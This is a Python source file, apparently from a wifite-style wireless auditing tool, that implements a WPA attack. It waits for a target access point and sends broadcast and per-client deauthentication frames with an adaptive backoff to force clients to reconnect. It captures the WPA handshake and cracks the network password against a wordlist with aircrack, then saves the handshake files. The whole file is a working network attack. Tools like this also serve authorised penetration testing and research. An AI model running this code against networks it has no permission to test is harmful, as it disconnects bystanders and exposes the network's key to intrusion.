#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..tools.aircrack import Aircrack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.process import Process
from ..util.timer import Timer
from ..model.handshake import Handshake
from ..model.wpa_result import CrackResultWPA

import time
import os
import re
from shutil import copy
import logging

logger = logging.getLogger(__name__)

class AttackWPA(Attack):
    """Enhanced WPA attack with adaptive timeouts and better deauth strategy"""
    
    # Adaptive timing
    MIN_DEAUTH_INTERVAL = 5
    MAX_DEAUTH_INTERVAL = 15
    DEAUTH_BACKOFF = 1.5
    HANDSHAKE_CHECK_INTERVAL = 2

    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False
        self.adaptive_deauth_interval = self.MIN_DEAUTH_INTERVAL

    def run(self):
        '''Initiates full WPA handshake capture attack with improvements'''

        # Validation checks
        if Configuration.wps_only and self.target.wps == False:
            Color.pl('{!} {O}Skipping WPA: --wps-only set{W}')
            self.success = False
            return self.success

        if Configuration.use_pmkid_only:
            self.success = False
            return False

        # Capture handshake
        handshake = self.capture_handshake()

        if handshake is None:
            self.success = False
            return self.success

        # Analyze
        Color.pl('\n{+} {G}Analyzing handshake...{W}')
        handshake.analyze()

        # Validate wordlist
        if not self._validate_wordlist():
            self.success = False
            return False

        # Crack handshake
        Color.pl('{+} {G}Cracking WPA handshake...{W}')
        key = Aircrack.crack_handshake(handshake, show_command=False)
        
        if key is None:
            Color.pl('{!} {R}Failed to crack handshake{W}')
            self.success = False
        else:
            Color.pl('{+} {G}Success! PSK: {W}{C}%s{W}\n' % key)
            self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, 
                                               handshake.capfile, key)
            self.crack_result.dump()
            self.success = True
        
        return self.success

    def _validate_wordlist(self):
        """Validate wordlist before cracking"""
        if Configuration.wordlist is None:
            Color.pl('{!} {O}No wordlist specified (use --dict){W}')
            return False

        if not os.path.exists(Configuration.wordlist):
            Color.pl('{!} {O}Wordlist not found: {R}%s{W}' % Configuration.wordlist)
            return False

        Color.pl('{+} {G}Using wordlist: {W}{C}%s{W}' % os.path.basename(Configuration.wordlist))
        return True

    def capture_handshake(self):
        '''Captures handshake with improved deauth strategy'''
        handshake = None

        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake', 'Waiting for target...')
            airodump_target = self.wait_for_target(airodump)

            self.clients = []

            # Try to load existing handshake
            if Configuration.ignore_old_handshakes == False:
                handshake = self._load_existing_handshake(airodump_target)
                if handshake:
                    return handshake

            # Capture new handshake
            handshake = self._capture_new_handshake(airodump, airodump_target)

        if handshake is None:
            Color.pl('{!} {R}Handshake capture failed{W}')
            return None

        # Save copy
        self.save_handshake(handshake)
        return handshake

    def _load_existing_handshake(self, airodump_target):
        """Try to load existing handshake"""
        bssid = airodump_target.bssid
        essid = airodump_target.essid if airodump_target.essid_known else None
        handshake = self.load_handshake(bssid=bssid, essid=essid)
        
        if handshake:
            Color.pl('{+} {G}Using existing handshake{W}')
            return handshake
        return None

    def _capture_new_handshake(self, airodump, airodump_target):
        """Capture new handshake with adaptive deauth"""
        handshake = None
        timeout_timer = Timer(Configuration.wpa_attack_timeout)
        deauth_timer = Timer(self.adaptive_deauth_interval)

        while handshake is None and not timeout_timer.ended():
            step_timer = Timer(self.HANDSHAKE_CHECK_INTERVAL)
            
            Color.clear_entire_line()
            Color.pattack('WPA', airodump_target, 'Capture',
                    'Clients: {G}%d{W}, Deauth: {O}%s{W}, Timeout: {R}%s{W}' 
                    % (len(self.clients), deauth_timer, timeout_timer))

            # Find and check cap files
            cap_files = airodump.find_files(endswith='.cap')
            if len(cap_files) > 0:
                handshake = self._check_handshake(cap_files[0], airodump_target)
                if handshake:
                    break

            # Discover new clients
            airodump_target = self.wait_for_target(airodump)
            self._discover_new_clients(airodump_target)

            # Send deauth if timer expired
            if deauth_timer.ended():
                self.deauth(airodump_target)
                self._adjust_deauth_interval()
                deauth_timer = Timer(self.adaptive_deauth_interval)

            time.sleep(step_timer.remaining())

        return handshake

    def _check_handshake(self, cap_file, airodump_target):
        """Check if cap file contains handshake"""
        try:
            temp_file = Configuration.temp('handshake.cap.bak')
            copy(cap_file, temp_file)

            bssid = airodump_target.bssid
            essid = airodump_target.essid if airodump_target.essid_known else None
            handshake = Handshake(temp_file, bssid=bssid, essid=essid)
            
            if handshake.has_handshake():
                Color.clear_entire_line()
                Color.pattack('WPA', airodump_target, 'Capture', '{G}Captured!{W}')
                Color.pl('')
                return handshake
            
            os.remove(temp_file)
        except Exception as e:
            logger.warning("Handshake check error: %s" % str(e))
        
        return None

    def _discover_new_clients(self, airodump_target):
        """Discover and report new clients"""
        for client in airodump_target.clients:
            if client.station not in self.clients:
                Color.clear_entire_line()
                Color.pattack('WPA', airodump_target, 'Capture',
                        'New client: {G}%s{W}' % client.station)
                Color.pl('')
                self.clients.append(client.station)

    def _adjust_deauth_interval(self):
        """Adjust deauth interval with backoff"""
        old_interval = self.adaptive_deauth_interval
        self.adaptive_deauth_interval = min(
            int(self.adaptive_deauth_interval * self.DEAUTH_BACKOFF),
            self.MAX_DEAUTH_INTERVAL
        )
        if old_interval != self.adaptive_deauth_interval:
            logger.debug("Deauth interval: %.1fs → %.1fs" 
                        % (old_interval, self.adaptive_deauth_interval))

    def load_handshake(self, bssid, essid):
        """Load handshake from filesystem"""
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        essid_pattern = re.escape(re.sub('[^a-zA-Z0-9]', '', essid)) if essid else '[a-zA-Z0-9]+'
        bssid_pattern = re.escape(bssid.replace(':', '-'))
        date_pattern = r'\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
        filename_pattern = re.compile('handshake_%s_%s_%s\.cap' 
                                     % (essid_pattern, bssid_pattern, date_pattern))

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename) and re.match(filename_pattern, filename):
                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

        return None

    def save_handshake(self, handshake):
        """Save handshake to filesystem"""
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid) if handshake.essid else 'Unknown'
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = 'handshake_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        Color.p('{+} Saving handshake to {C}%s{W}...' % cap_filename)
        
        try:
            if Configuration.wpa_strip_handshake:
                handshake.strip(outfile=cap_filename)
            else:
                copy(handshake.capfile, cap_filename)
            Color.pl('{G}done{W}')
            handshake.capfile = cap_filename
        except Exception as e:
            logger.exception("Error saving handshake: %s" % str(e))
            Color.pl('{R}failed{W}')

    def deauth(self, target):
        """Send deauth with improved targeting"""
        if Configuration.no_deauth:
            return

        # Deauth broadcast
        Color.clear_entire_line()
        Color.pattack('WPA', target, 'Handshake', 'Deauthing broadcast...')
        Aireplay.deauth(target.bssid, client_mac=None, timeout=2)

        # Deauth specific clients
        for client in self.clients[:3]:  # Limit to 3 clients per deauth round
            Color.clear_entire_line()
            Color.pattack('WPA', target, 'Handshake', 'Deauthing {C}%s{W}...' % client)
            Aireplay.deauth(target.bssid, client_mac=client, timeout=2)
